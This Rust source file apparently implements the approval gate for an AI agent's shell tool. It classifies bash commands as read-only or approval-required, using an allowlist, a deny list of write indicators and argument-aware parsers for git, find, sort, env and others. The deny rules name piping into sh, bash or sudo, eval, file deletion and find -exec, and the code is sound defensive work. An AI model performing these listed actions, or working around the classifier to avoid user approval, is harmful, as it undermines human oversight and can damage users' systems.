//! Which edge tool names require an `approval_required` round-trip before `tool_request`
//! in cloud-orchestrated delivery ([`super::cloud_tool_delivery`]).
//!
//! CLI permission prompts use [`cloud_gated_tool_kind`] so icons (Execute vs Write) and cloud gating
//! cannot drift.

/// Canonical tool names requiring user approval, derived from the central
/// [`crate::tool_categories`] registry.
pub static CLOUD_APPROVAL_REQUIRED_TOOLS: std::sync::LazyLock<Vec<&'static str>> =
    std::sync::LazyLock::new(|| {
        let mut v = crate::tool::categories::registry().approval_required_names();
        v.sort();
        v
    });

/// Subset of approval-required tools that take a shell `command` argument.
pub static CLOUD_APPROVAL_EXECUTE_TOOLS: std::sync::LazyLock<Vec<&'static str>> =
    std::sync::LazyLock::new(|| {
        let mut v = crate::tool::categories::registry().execute_command_names();
        v.sort();
        v
    });

/// Whether a tool name requires cloud approval.
pub fn is_cloud_approval_required(name: &str) -> bool {
    crate::tool::categories::registry().is_approval_required(name)
}

/// Whether a tool name is a shell/execute command.
pub fn is_cloud_execute_tool(name: &str) -> bool {
    crate::tool::categories::registry().is_execute_command(name)
}

/// Read-only shell commands that can run concurrently without user approval.
/// These commands only read data and don't modify system state.
///
/// Commands with any mutating option or operand form must not appear here.
/// Keep those in the argument-aware match in [`argv_family_is_read_only`].
const SIMPLE_READ_ONLY_COMMANDS: &[&str] = &[
    // File viewing
    "cat", "head", "tail", "wc", "stat", "ls", "ll", // Search tools
    "grep", "find", "fd", "rg", "ag", "ack", "locate", // System info
    "pwd", "which", "type", "uname", "id", "df", "du", "free", "uptime", "whoami", "env",
    "printenv", "cal", "nproc", // Text processing (no output redirection)
    "cut", "paste", "tr", "nl", "column", "fmt", "fold", "expand", // Path tools
    "basename", "dirname", "realpath", "readlink", // Misc safe
    "echo", "true", "false", "test", "expr", "seq", "sleep", "cd",
];

/// Patterns that indicate a command has side effects (not read-only).
const WRITE_INDICATORS: &[&str] = &[
    // Output redirection
    ">",
    ">>",
    // Pipe to potentially dangerous commands
    "| tee ",
    "| xargs ",
    "| sh",
    "| bash",
    "| sudo",
    // Git write operations
    "git add",
    "git commit",
    "git push",
    "git pull",
    "git merge",
    "git rebase",
    "git reset",
    "git checkout",
    "git stash pop",
    "git stash apply",
    "git stash drop",
    "git stash clear",
    "git clean",
    "git rm",
    "git mv",
    // File operations
    "rm ",
    "mv ",
    "cp ",
    "mkdir ",
    "rmdir ",
    "touch ",
    "chmod ",
    "chown ",
    "ln ",
    "sed -i",
    "perl -pi",
    // Package managers (install/modify)
    "npm install",
    "npm i ",
    "npm uninstall",
    "npm update",
    "pip install",
    "pip3 install",
    "pip uninstall",
    "cargo install",
    "cargo build",
    "cargo run",
    "cargo clean",
    "apt install",
    "apt-get install",
    "brew install",
    // Dangerous
    "sudo ",
    "su ",
    "eval ",
    "exec ",
];

/// Strip benign fd forwarding (`2>&1`, `1>&2`) and explicit `/dev/null`
/// disposal so downstream scans don't flag pure stderr/stdout plumbing.
/// Redirects to ordinary files are deliberately retained because they create,
/// truncate, or append data and therefore require mutation handling.
///
/// This is the **single source of truth** for benign-redirect normalization.
/// `astra_runtime::bash_intent::segment_is_mutating` re-exports this via the
/// public API so the permission gate (read-only check) and the cache gate
/// (mutation check) cannot drift. Do not fork a local copy — extend here.
pub fn strip_benign_fd_redirects(command: &str) -> String {
    astra_sandbox::strip_benign_bash_redirects(command)
}

/// Why a bash command was classified as **requiring approval** (not read-only).
///
/// Returned by [`bash_command_approval_reason`]. Surfaced in CLI approval
/// prompts so users can understand *why* a command tripped the classifier.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BashApprovalReason {
    /// Command string was empty after trimming.
    Empty,
    /// Contains shell injection vectors.
    ShellInjection,
    /// Contains a write indicator (`>`, `rm`, `sed -i`, etc.).
    WriteIndicator(String),
    /// Command prefix is not in the read-only allowlist.
    UnknownPrefix(String),
}

impl BashApprovalReason {
    /// Short, human-readable rationale suitable for an approval prompt line.
    pub fn display(&self) -> String {
        match self {
            BashApprovalReason::Empty => "empty command".to_string(),
            BashApprovalReason::ShellInjection => {
                "shell syntax cannot be verified as read-only".to_string()
            }
            BashApprovalReason::WriteIndicator(ind) => {
                let action = humanize_write_indicator(ind.as_str());
                format!("{action} (`{trimmed}`)", trimmed = ind.trim())
            }
            BashApprovalReason::UnknownPrefix(tok) => {
                format!("`{tok}` may modify your system (unrecognized command)")
            }
        }
    }
}

fn humanize_write_indicator(indicator: &str) -> &'static str {
    let trimmed = indicator.trim();
    const TABLE: &[(&str, &str)] = &[
        (">>", "appends to a file"),
        (">", "writes to a file"),
        ("rm", "deletes files"),
        ("mv", "moves or renames files"),
        ("cp", "copies files"),
        ("mkdir", "creates directories"),
        ("rmdir", "removes directories"),
        ("touch", "creates or updates files"),
        ("chmod", "changes file permissions"),
        ("chown", "changes file ownership"),
        ("ln", "creates a link"),
        ("sed -i", "edits files in place"),
        ("perl -pi", "edits files in place"),
        ("git add", "stages changes in git"),
        ("git commit", "creates a git commit"),
        ("git push", "pushes to a remote"),
        ("git pull", "pulls from a remote"),
        ("git merge", "merges branches"),
        ("git rebase", "rebases a branch"),
        ("git reset", "resets git state"),
        ("git checkout", "switches branches or restores files"),
        ("git stash pop", "applies and drops a stash"),
        ("git stash apply", "applies a stash"),
        ("git stash drop", "drops a stash"),
        ("git stash clear", "clears all stashes"),
        ("git clean", "deletes untracked files"),
        ("git rm", "removes files from git"),
        ("git mv", "moves files in git"),
        ("npm install", "installs packages"),
        ("npm i", "installs packages"),
        ("npm uninstall", "uninstalls packages"),
        ("npm update", "updates packages"),
        ("pip install", "installs packages"),
        ("pip3 install", "installs packages"),
        ("pip uninstall", "uninstalls packages"),
        ("cargo install", "installs a cargo binary"),
        ("cargo build", "builds the cargo project"),
        ("| tee", "writes via `tee`"),
        ("| xargs", "pipes to `xargs` (may execute commands)"),
        ("| sh", "pipes into a shell"),
        ("| bash", "pipes into a shell"),
        ("| sudo", "pipes into `sudo`"),
    ];
    for (prefix, phrase) in TABLE {
        if trimmed.starts_with(prefix) {
            return phrase;
        }
    }
    "may modify your system"
}

/// Check if a bash command is read-only (safe for concurrent execution).
///
/// Returns `true` if the command appears to only read data without side effects.
/// Used to allow read-only bash commands to run concurrently without user approval.
///
/// Thin wrapper over [`bash_command_approval_reason`]: returns `true` iff the
/// classifier reports no reason to require approval. See that function for the
/// full algorithm.
pub fn bash_command_is_read_only(command: &str) -> bool {
    bash_command_approval_reason(command).is_none()
}

/// Classify a bash command and return the rationale if approval is required.
///
/// Returns `None` when the command is read-only (no approval needed). Returns
/// `Some(reason)` explaining why the command tripped the classifier — used by
/// CLI approval prompts to show users *why* a command needs their confirmation.
///
/// # Algorithm
/// 1. Normalize harmless fd forwarding (`2>&1`, `1>&2`, `/dev/null`, …)
/// 2. Parse a deliberately small, literal-only bash AST into argv commands
/// 3. Require every argv in a compound/pipeline to satisfy command semantics
/// 4. Fail closed when syntax or command behavior cannot be proven read-only
pub fn bash_command_approval_reason(command: &str) -> Option<BashApprovalReason> {
    let cmd = command.trim();

    if cmd.is_empty() {
        return Some(BashApprovalReason::Empty);
    }

    let normalized = strip_benign_fd_redirects(cmd);
    let normalized = normalized.trim();
    if normalized.is_empty() {
        return Some(BashApprovalReason::Empty);
    }
    let Some(commands) = astra_sandbox::parse_plain_bash_commands(normalized) else {
        return Some(BashApprovalReason::ShellInjection);
    };
    for words in commands {
        if let Some(reason) = bash_argv_approval_reason(&words) {
            return Some(reason);
        }
    }
    None
}

/// Argv-level classifier with rationale. Shell syntax cannot influence this
/// function: quotes have already become literal arguments and every command
/// boundary has already been identified by the AST parser.
fn bash_argv_approval_reason(words: &[String]) -> Option<BashApprovalReason> {
    if words.is_empty() {
        return Some(BashApprovalReason::Empty);
    }
    let effective_words = match unwrap_static_env(words) {
        Ok(None) => return None,
        Ok(Some(words)) => words,
        Err(()) => return Some(BashApprovalReason::UnknownPrefix("env".to_string())),
    };
    if let Some(indicator) = read_family_mutating_argument(effective_words) {
        return Some(BashApprovalReason::WriteIndicator(indicator.to_string()));
    }
    let effective_command = effective_words.join(" ");
    if let Some(indicator) = WRITE_INDICATORS.iter().copied().find(|indicator| {
        let indicator = indicator.trim();
        !indicator.starts_with(['>', '|'])
            && effective_command
                .strip_prefix(indicator)
                .is_some_and(|rest| rest.is_empty() || rest.starts_with(char::is_whitespace))
    }) {
        return Some(BashApprovalReason::WriteIndicator(indicator.to_string()));
    }
    if !argv_family_is_read_only(effective_words) {
        return Some(BashApprovalReason::UnknownPrefix(
            effective_words[0].clone(),
        ));
    }
    None
}

fn argv_family_is_read_only(words: &[String]) -> bool {
    match words.first().map(String::as_str) {
        Some("sed") => {
            words.len() <= 4
                && words.get(1).map(String::as_str) == Some("-n")
                && words
                    .get(2)
                    .is_some_and(|script| sed_script_is_print_only(script))
        }
        Some("rg") => !words.iter().skip(1).any(|arg| {
            matches!(
                arg.as_str(),
                "--pre" | "--hostname-bin" | "--search-zip" | "-z"
            ) || arg.starts_with("--pre=")
                || arg.starts_with("--hostname-bin=")
        }),
        Some("fd") => !words.iter().skip(1).any(|arg| {
            matches!(
                arg.as_str(),
                "-x" | "--exec" | "-X" | "--exec-batch" | "-l" | "--list-details"
            ) || arg.starts_with("--exec=")
                || arg.starts_with("--exec-batch=")
                || arg.starts_with("-x")
                || arg.starts_with("-X")
        }),
        Some("sort") => sort_argv_is_read_only(&words[1..]),
        Some("tree") => tree_argv_is_read_only(&words[1..]),
        Some("file") => file_argv_is_read_only(&words[1..]),
        Some("printf") => printf_argv_is_read_only(&words[1..]),
        Some("uniq") => uniq_argv_is_read_only(&words[1..]),
        Some("date") => date_argv_is_read_only(&words[1..]),
        Some("hostname") => hostname_argv_is_read_only(&words[1..]),
        Some("git") => git_argv_is_read_only(words),
        // Build tools may execute project-controlled plugins, build scripts,
        // proc macros or formatter hooks even when their subcommand sounds
        // observational. They are intentionally not auto-approved.
        Some("cargo" | "rustfmt") => false,
        Some("npm") => npm_argv_is_read_only(words),
        Some("node") | Some("python") | Some("python3") => {
            words.len() == 2 && words.get(1).map(String::as_str) == Some("--version")
        }
        Some("pip") | Some("pip3") => {
            matches!(words.get(1).map(String::as_str), Some("list" | "freeze"))
        }
        Some(command) => SIMPLE_READ_ONLY_COMMANDS.contains(&command),
        None => false,
    }
}

/// Validate a conventional option grammar. Unknown options fail closed;
/// positional operands are permitted only because the command family itself
/// is observational. This is deliberately an allowlist rather than a list of
/// flags which happened to be known-dangerous at implementation time.
fn options_are_known(args: &[String], switches: &[&str], value_options: &[&str]) -> bool {
    options_are_known_with_arity(args, switches, value_options, &[], &[], &[])
}

#[derive(Clone, Copy)]
enum OptionArity {
    Flag,
    RequiredSeparateOrEquals,
    RequiredEquals,
    OptionalEquals,
    OptionalShortAttached,
}

/// Parse argv according to explicit option arity. Optional values never
/// consume the next argv, so a following effectful flag cannot be hidden as a
/// value. Unknown options and abbreviations fail closed.
fn options_are_known_with_arity(
    args: &[String],
    switches: &[&str],
    value_options: &[&str],
    required_equals_options: &[&str],
    optional_equals_options: &[&str],
    optional_short_attached_options: &[&str],
) -> bool {
    let mut index = 0;
    let mut options_done = false;
    while index < args.len() {
        let arg = args[index].as_str();
        if !options_done && arg == "--" {
            options_done = true;
            index += 1;
            continue;
        }
        if !options_done && arg.starts_with('-') && arg != "-" {
            let spec = if switches.contains(&arg) {
                Some(OptionArity::Flag)
            } else if value_options.contains(&arg)
                || value_options.iter().any(|option| {
                    option.starts_with("--") && arg.starts_with(&format!("{option}="))
                        || option.len() == 2
                            && option.starts_with('-')
                            && arg.starts_with(option)
                            && arg.len() > option.len()
                })
            {
                Some(OptionArity::RequiredSeparateOrEquals)
            } else if required_equals_options.iter().any(|option| {
                arg.starts_with(&format!("{option}=")) && arg.len() > option.len() + 1
            }) {
                Some(OptionArity::RequiredEquals)
            } else if optional_equals_options.contains(&arg)
                || optional_equals_options
                    .iter()
                    .any(|option| arg.starts_with(&format!("{option}=")))
            {
                Some(OptionArity::OptionalEquals)
            } else if optional_short_attached_options.contains(&arg)
                || optional_short_attached_options
                    .iter()
                    .any(|option| arg.starts_with(option) && arg.len() > option.len())
            {
                Some(OptionArity::OptionalShortAttached)
            } else {
                None
            };
            match spec {
                Some(OptionArity::RequiredSeparateOrEquals) if value_options.contains(&arg) => {
                    if index + 1 >= args.len() {
                        return false;
                    }
                    index += 2;
                    continue;
                }
                Some(_) => {
                    index += 1;
                    continue;
                }
                None => return false,
            }
        }
        index += 1;
    }
    true
}

fn sort_argv_is_read_only(args: &[String]) -> bool {
    // Do not accept abbreviated long options: GNU `sort --o=FILE` means
    // `--output=FILE`. Requiring an exact known option closes that class.
    const SWITCHES: &[&str] = &[
        "-b",
        "-d",
        "-f",
        "-g",
        "-h",
        "-i",
        "-M",
        "-n",
        "-R",
        "-r",
        "-s",
        "-u",
        "-V",
        "-z",
        "--dictionary-order",
        "--general-numeric-sort",
        "--human-numeric-sort",
        "--ignore-case",
        "--ignore-leading-blanks",
        "--ignore-nonprinting",
        "--month-sort",
        "--numeric-sort",
        "--random-sort",
        "--reverse",
        "--stable",
        "--unique",
        "--version-sort",
        "--zero-terminated",
        "--help",
        "--version",
    ];
    const VALUE_OPTIONS: &[&str] = &[
        "-k",
        "--key",
        "-t",
        "--field-separator",
        "-S",
        "--buffer-size",
        "-T",
        "--temporary-directory",
        "--batch-size",
        "--parallel",
        "--random-source",
    ];
    options_are_known(args, SWITCHES, VALUE_OPTIONS)
}

fn tree_argv_is_read_only(args: &[String]) -> bool {
    const SWITCHES: &[&str] = &[
        "-a",
        "-d",
        "-f",
        "-i",
        "-s",
        "-h",
        "-u",
        "-g",
        "-p",
        "-D",
        "-F",
        "-q",
        "-N",
        "-C",
        "-n",
        "-Q",
        "-J",
        "-X",
        "--dirsfirst",
        "--filesfirst",
        "--du",
        "--prune",
        "--noreport",
        "--help",
        "--version",
    ];
    const VALUE_OPTIONS: &[&str] = &[
        "-L",
        "--filelimit",
        "-P",
        "-I",
        "--timefmt",
        "--sort",
        "--charset",
    ];
    options_are_known(args, SWITCHES, VALUE_OPTIONS)
}

fn file_argv_is_read_only(args: &[String]) -> bool {
    const SWITCHES: &[&str] = &[
        "-b",
        "--brief",
        "-E",
        "--extension",
        "-i",
        "--mime",
        "--mime-type",
        "--mime-encoding",
        "-k",
        "--keep-going",
        "-L",
        "--dereference",
        "-h",
        "--no-dereference",
        "-N",
        "--no-pad",
        "-p",
        "--preserve-date",
        "-r",
        "--raw",
        "-s",
        "--special-files",
        "-v",
        "--version",
        "-z",
        "--uncompress",
        "--help",
    ];
    const VALUE_OPTIONS: &[&str] = &["-e", "--exclude", "-m", "--magic-file", "-P", "--parameter"];
    options_are_known(args, SWITCHES, VALUE_OPTIONS)
}

fn printf_argv_is_read_only(args: &[String]) -> bool {
    match args {
        [] => true,
        [first, ..] if first == "--" => args.len() >= 2,
        [first, ..] => !first.starts_with('-'),
    }
}

fn uniq_argv_is_read_only(args: &[String]) -> bool {
    const SWITCHES: &[&str] = &[
        "-c",
        "--count",
        "-d",
        "--repeated",
        "-D",
        "--all-repeated",
        "-i",
        "--ignore-case",
        "-u",
        "--unique",
        "-z",
        "--zero-terminated",
        "--help",
        "--version",
    ];
    const VALUE_OPTIONS: &[&str] = &[
        "-f",
        "--skip-fields",
        "-s",
        "--skip-chars",
        "-w",
        "--check-chars",
    ];
    if !options_are_known(args, SWITCHES, VALUE_OPTIONS) {
        return false;
    }
    let mut index = 0;
    let mut positional = 0;
    let mut options_done = false;
    while index < args.len() {
        let arg = args[index].as_str();
        if !options_done && arg == "--" {
            options_done = true;
            index += 1;
            continue;
        }
        if !options_done && VALUE_OPTIONS.contains(&arg) {
            index += 2;
            continue;
        }
        if !options_done
            && VALUE_OPTIONS
                .iter()
                .any(|option| option.starts_with("--") && arg.starts_with(&format!("{option}=")))
        {
            index += 1;
            continue;
        }
        if !options_done && arg.starts_with('-') && arg != "-" {
            index += 1;
            continue;
        }
        positional += 1;
        index += 1;
    }
    // GNU uniq's second positional operand is an output file.
    positional <= 1
}

fn date_argv_is_read_only(args: &[String]) -> bool {
    const SWITCHES: &[&str] = &[
        "-u",
        "--utc",
        "--universal",
        "-R",
        "--rfc-email",
        "--resolution",
        "--help",
        "--version",
        "--iso-8601",
    ];
    const VALUE_OPTIONS: &[&str] = &["-d", "--date", "-r", "--reference", "-f", "--file"];
    if !options_are_known(args, SWITCHES, VALUE_OPTIONS) {
        return false;
    }
    // Date accepts a bare operand as a request to set the clock. The only
    // positional form which is observational is an output format.
    let mut index = 0;
    while index < args.len() {
        let arg = args[index].as_str();
        if VALUE_OPTIONS.contains(&arg) {
            index += 2;
            continue;
        }
        if VALUE_OPTIONS.iter().any(|option| {
            option.starts_with("--") && arg.starts_with(&format!("{option}="))
                || option.len() == 2
                    && option.starts_with('-')
                    && arg.starts_with(option)
                    && arg.len() > 2
        }) || SWITCHES.contains(&arg)
            || arg == "--"
        {
            index += 1;
            continue;
        }
        if !arg.starts_with('+') {
            return false;
        }
        index += 1;
    }
    true
}

fn hostname_argv_is_read_only(args: &[String]) -> bool {
    const QUERY_SWITCHES: &[&str] = &[
        "-a",
        "--alias",
        "-d",
        "--domain",
        "-f",
        "--fqdn",
        "--long",
        "-i",
        "--ip-address",
        "-I",
        "--all-ip-addresses",
        "-s",
        "--short",
        "-y",
        "--yp",
        "--nis",
        "-V",
        "--version",
        "-h",
        "--help",
    ];
    args.iter()
        .all(|arg| QUERY_SWITCHES.contains(&arg.as_str()))
}

fn npm_argv_is_read_only(words: &[String]) -> bool {
    match words.get(1).map(String::as_str) {
        Some("--version") => words.len() == 2,
        Some("list" | "ls" | "outdated") => words
            .iter()
            .skip(2)
            .all(|arg| !matches!(arg.as_str(), "fix" | "--fix") && !arg.starts_with("--fix=")),
        _ => false,
    }
}

fn sed_script_is_print_only(script: &str) -> bool {
    let Some(body) = script.strip_suffix('p') else {
        return false;
    };
    if body.is_empty() {
        return false;
    }
    let mut parts = body.split(',');
    let first = parts.next().unwrap_or_default();
    let second = parts.next();
    parts.next().is_none()
        && first.bytes().all(|byte| byte.is_ascii_digit())
        && second
            .is_none_or(|part| !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit()))
}

fn git_argv_is_read_only(words: &[String]) -> bool {
    // These are inert global display/configuration switches.  They precede
    // the subcommand, so treating `git --no-pager diff ...` as an unknown
    // command would make a read-only producer look like a workspace writer
    // to every downstream effect classifier.
    let subcommand_index = words
        .iter()
        .enumerate()
        .skip(1)
        .find_map(|(index, word)| (word != "--no-pager").then_some(index));
    let Some(subcommand_index) = subcommand_index else {
        return false;
    };
    let Some(subcommand) = words.get(subcommand_index).map(String::as_str) else {
        return false;
    };
    let args = &words[subcommand_index + 1..];
    match subcommand {
        "status" => options_are_known_with_arity(
            args,
            &[
                "-s",
                "--short",
                "-b",
                "--branch",
                "--show-stash",
                "--porcelain",
                "-z",
                "--long",
                "-v",
                "--verbose",
                "--untracked-files",
                "--ignore-submodules",
                "--ignored",
                "--no-renames",
                "--help",
            ],
            &[],
            &[],
            &[
                "--porcelain",
                "--untracked-files",
                "--ignore-submodules",
                "--ignored",
            ],
            &[],
        ),
        "log" | "show" => git_history_argv_is_read_only(args),
        "diff" => git_diff_argv_is_read_only(args),
        "ls-files" => options_are_known(
            args,
            &[
                "-c",
                "--cached",
                "-d",
                "--deleted",
                "-m",
                "--modified",
                "-o",
                "--others",
                "-i",
                "--ignored",
                "-s",
                "--stage",
                "-u",
                "--unmerged",
                "-k",
                "--killed",
                "--directory",
                "--no-empty-directory",
                "--eol",
                "--deduplicate",
                "-z",
                "--recurse-submodules",
                "--error-unmatch",
                "--with-tree",
                "--full-name",
            ],
            &[
                "-x",
                "--exclude",
                "-X",
                "--exclude-from",
                "--exclude-standard",
            ],
        ),
        "rev-parse" => options_are_known(
            args,
            &[
                "--parseopt",
                "--sq-quote",
                "--keep-dashdash",
                "--stop-at-non-option",
                "--stuck-long",
                "--revs-only",
                "--no-revs",
                "--flags",
                "--no-flags",
                "--default",
                "--prefix",
                "--verify",
                "--quiet",
                "-q",
                "--sq",
                "--short",
                "--symbolic",
                "--symbolic-full-name",
                "--abbrev-ref",
                "--all",
                "--branches",
                "--tags",
                "--remotes",
                "--glob",
                "--exclude",
                "--exclude-hidden",
                "--disambiguate",
                "--local-env-vars",
                "--path-format",
                "--git-dir",
                "--absolute-git-dir",
                "--git-common-dir",
                "--is-inside-git-dir",
                "--is-inside-work-tree",
                "--is-bare-repository",
                "--is-shallow-repository",
                "--show-cdup",
                "--show-prefix",
                "--show-object-format",
                "--show-ref-format",
                "--show-toplevel",
                "--show-superproject-working-tree",
            ],
            &[
                "--short",
                "--abbrev-ref",
                "--branches",
                "--tags",
                "--remotes",
                "--glob",
                "--exclude",
                "--exclude-hidden",
                "--disambiguate",
                "--path-format",
            ],
        ),
        "describe" => options_are_known_with_arity(
            args,
            &[
                "--all",
                "--tags",
                "--contains",
                "--debug",
                "--long",
                "--always",
                "--first-parent",
                "--exact-match",
                "--dirty",
                "--broken",
            ],
            &["--match", "--exclude"],
            &[],
            &["--candidates", "--abbrev", "--dirty", "--broken"],
            &[],
        ),
        "remote" => git_remote_argv_is_read_only(args),
        "tag" => git_tag_argv_is_read_only(args),
        "config" => {
            matches!(args.first().map(String::as_str), Some("--get" | "--list"))
                && !args
                    .iter()
                    .any(|arg| matches!(arg.as_str(), "--add" | "--replace-all"))
        }
        "stash" => {
            args.first().map(String::as_str) == Some("list")
                && git_history_argv_is_read_only(&args[1..])
        }
        "branch" => git_branch_argv_is_read_only(args),
        _ => false,
    }
}

fn git_history_argv_is_read_only(args: &[String]) -> bool {
    const SWITCHES: &[&str] = &[
        "-p",
        "--patch",
        "-s",
        "--no-patch",
        "--stat",
        "--shortstat",
        "--numstat",
        "--name-only",
        "--name-status",
        "--oneline",
        "--graph",
        "--all",
        "--branches",
        "--tags",
        "--remotes",
        "--reverse",
        "--no-merges",
        "--merges",
        "--decorate",
        "--no-decorate",
        "--source",
        "--use-mailmap",
        "--no-use-mailmap",
        "--first-parent",
        "--full-history",
        "--simplify-merges",
        "--date-order",
        "--author-date-order",
        "--topo-order",
        "--walk-reflogs",
        "-g",
        "--no-walk",
        "--do-walk",
        "--show-signature",
        "--notes",
        "--abbrev",
    ];
    const VALUE_OPTIONS: &[&str] = &[
        "-n",
        "--max-count",
        "--since",
        "--after",
        "--until",
        "--before",
        "--author",
        "--committer",
        "--grep",
        "--encoding",
    ];
    let without_numeric_limit = args
        .iter()
        .filter(|arg| {
            !(arg.strip_prefix('-').is_some_and(|digits| {
                !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit())
            }))
        })
        .cloned()
        .collect::<Vec<_>>();
    options_are_known_with_arity(
        &without_numeric_limit,
        SWITCHES,
        VALUE_OPTIONS,
        &["--format", "--date"],
        &[
            "--decorate",
            "--notes",
            "--abbrev",
            "--pretty",
            "--diff-filter",
        ],
        &[],
    )
}

fn git_diff_argv_is_read_only(args: &[String]) -> bool {
    // `--no-index` has separate external-diff semantics, and Git accepts
    // abbreviated long flags such as `--ext` for `--ext-diff`. An explicit
    // option allowlist rejects both abbreviations and future executable hooks.
    const SWITCHES: &[&str] = &[
        "-p",
        "--patch",
        "-s",
        "--no-patch",
        "-u",
        "--raw",
        "--patch-with-raw",
        "--indent-heuristic",
        "--minimal",
        "--patience",
        "--histogram",
        "--anchored",
        "--stat",
        "--numstat",
        "--shortstat",
        "--summary",
        "--name-only",
        "--name-status",
        "--check",
        "--full-index",
        "--binary",
        "--abbrev",
        "-R",
        "--find-renames",
        "--no-renames",
        "--find-copies",
        "--find-copies-harder",
        "--irreversible-delete",
        "--diff-algorithm",
        "--word-diff",
        "--color-words",
        "--color",
        "--no-color",
        "--relative",
        "--text",
        "-a",
        "--ignore-space-at-eol",
        "-b",
        "--ignore-space-change",
        "-w",
        "--ignore-all-space",
        "--ignore-blank-lines",
        "--exit-code",
        "--quiet",
        "--cached",
        "--staged",
        "--merge-base",
        "--submodule",
    ];
    const REQUIRED_EQUALS_OPTIONS: &[&str] = &[
        "--output-indicator-new",
        "--output-indicator-old",
        "--output-indicator-context",
        "--stat-width",
        "--stat-name-width",
        "--stat-count",
        "--diff-algorithm",
        "--src-prefix",
        "--dst-prefix",
        "--line-prefix",
    ];
    options_are_known_with_arity(
        args,
        SWITCHES,
        &[],
        REQUIRED_EQUALS_OPTIONS,
        &[
            "--unified",
            "--dirstat",
            "--abbrev",
            "--find-renames",
            "--find-copies",
            "--word-diff",
            "--color-words",
            "--color",
            "--relative",
            "--submodule",
            "--diff-filter",
        ],
        &["-U"],
    )
}

fn git_remote_argv_is_read_only(args: &[String]) -> bool {
    args.is_empty()
        || args
            .iter()
            .all(|arg| matches!(arg.as_str(), "-v" | "--verbose"))
        || args.first().map(String::as_str) == Some("get-url")
}

fn git_tag_argv_is_read_only(args: &[String]) -> bool {
    args.is_empty()
        || args.iter().all(|arg| {
            matches!(
                arg.as_str(),
                "-l" | "--list" | "-n" | "--contains" | "--no-contains"
            ) || arg.starts_with("--format=")
                || arg.starts_with("--sort=")
                || arg.starts_with("--contains=")
                || arg.starts_with("--no-contains=")
                || !arg.starts_with('-')
                    && matches!(args.first().map(String::as_str), Some("-l" | "--list"))
        })
}

fn git_branch_argv_is_read_only(args: &[String]) -> bool {
    if args.is_empty() {
        return true;
    }
    args.iter().all(|arg| {
        matches!(
            arg.as_str(),
            "-a" | "--all"
                | "-r"
                | "--remotes"
                | "-l"
                | "--list"
                | "--show-current"
                | "-v"
                | "-vv"
                | "--verbose"
        ) || arg.starts_with("--format=")
            || arg.starts_with("--sort=")
            || arg.starts_with("--contains=")
            || arg.starts_with("--no-contains=")
            || arg.starts_with("--merged=")
            || arg.starts_with("--no-merged=")
            || arg.starts_with("--points-at=")
            || !arg.starts_with('-') && args.first().map(String::as_str) == Some("--list")
    })
}

/// Read-oriented command families can still contain explicit write forms.
/// Keep these argument semantics in the canonical approval classifier rather
/// than duplicating command vocabulary in scheduling/evaluation code.
fn read_family_mutating_argument(effective_words: &[String]) -> Option<&'static str> {
    let words = effective_words;
    let words = words.iter().map(String::as_str).collect::<Vec<_>>();
    match words.as_slice() {
        ["find", args @ ..] => args.iter().find_map(|arg| match *arg {
            // `find` is observational only until one of its explicit
            // execution or file-output actions appears. Gate the action token
            // itself, regardless of the nested command, so an allowlisted
            // prefix cannot smuggle an arbitrary mutator.
            "-exec" | "-execdir" | "-ok" | "-okdir" => Some("find execute action"),
            "-delete" => Some("find delete action"),
            "-fprint" | "-fprint0" | "-fprintf" | "-fls" => Some("find file-output action"),
            _ => None,
        }),
        ["sort", args @ ..]
            if args.iter().any(|arg| {
                *arg == "-o"
                    || *arg == "--output"
                    || arg.starts_with("--output=")
                    || (arg.starts_with("-o") && arg.len() > 2)
            }) =>
        {
            Some("sort output option")
        }
        ["git", "branch", args @ ..]
            if !args.is_empty()
                && !args.iter().any(|arg| {
                    matches!(
                        *arg,
                        "-a" | "--all"
                            | "-r"
                            | "--remotes"
                            | "-l"
                            | "--list"
                            | "--show-current"
                            | "-v"
                            | "-vv"
                            | "--verbose"
                            | "--contains"
                            | "--no-contains"
                            | "--merged"
                            | "--no-merged"
                            | "--format"
                            | "--sort"
                            | "--points-at"
                            | "--column"
                    ) || arg.starts_with("--format=")
                        || arg.starts_with("--sort=")
                        || arg.starts_with("--contains=")
                        || arg.starts_with("--no-contains=")
                        || arg.starts_with("--merged=")
                        || arg.starts_with("--no-merged=")
                        || arg.starts_with("--points-at=")
                }) =>
        {
            Some("git branch mutation form")
        }
        _ => None,
    }
}

/// Peel static `env`/assignment prefixes without executing or expanding
/// anything. `Ok(None)` is a plain environment listing; `Err` is an unsupported
/// wrapper shape and must remain approval-required.
fn unwrap_static_env(mut words: &[String]) -> Result<Option<&[String]>, ()> {
    while words.first().map(String::as_str) == Some("env") {
        let mut index = 1;
        let mut options_done = false;
        while index < words.len() {
            let word = words[index].as_str();
            if !options_done && word == "--" {
                options_done = true;
                index += 1;
                continue;
            }
            if !options_done && matches!(word, "-i" | "--ignore-environment" | "-0" | "--null") {
                index += 1;
                continue;
            }
            if !options_done && matches!(word, "-u" | "--unset") {
                if index + 1 >= words.len() {
                    return Err(());
                }
                if !safe_env_assignment_name(&words[index + 1]) {
                    return Err(());
                }
                index += 2;
                continue;
            }
            if !options_done && matches!(word, "-C" | "--chdir") {
                if index + 1 >= words.len() {
                    return Err(());
                }
                index += 2;
                continue;
            }
            if !options_done && word.starts_with("--unset=") {
                if !safe_env_assignment_name(word.trim_start_matches("--unset=")) {
                    return Err(());
                }
                index += 1;
                continue;
            }
            if !options_done && word.starts_with("--chdir=") {
                index += 1;
                continue;
            }
            if !options_done && word.starts_with('-') {
                return Err(());
            }
            if let Some((name, _)) = word.split_once('=').filter(|(name, _)| {
                !name.is_empty()
                    && name.bytes().enumerate().all(|(offset, byte)| {
                        byte == b'_'
                            || byte.is_ascii_alphanumeric()
                                && (offset > 0 || !byte.is_ascii_digit())
                    })
            }) {
                if !safe_env_assignment_name(name) {
                    return Err(());
                }
                index += 1;
                continue;
            }
            break;
        }
        if index == words.len() {
            return Ok(None);
        }
        words = &words[index..];
    }
    Ok(Some(words))
}

fn safe_env_assignment_name(name: &str) -> bool {
    matches!(
        name,
        "LC_ALL"
            | "LC_CTYPE"
            | "LANG"
            | "LANGUAGE"
            | "TZ"
            | "NO_COLOR"
            | "TERM"
            | "COLUMNS"
            | "LINES"
            | "GIT_CONFIG_NOSYSTEM"
    )
}

/// Kind of side effect for tools gated before edge execution.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CloudGatedToolKind {
    Write,
    Execute,
}

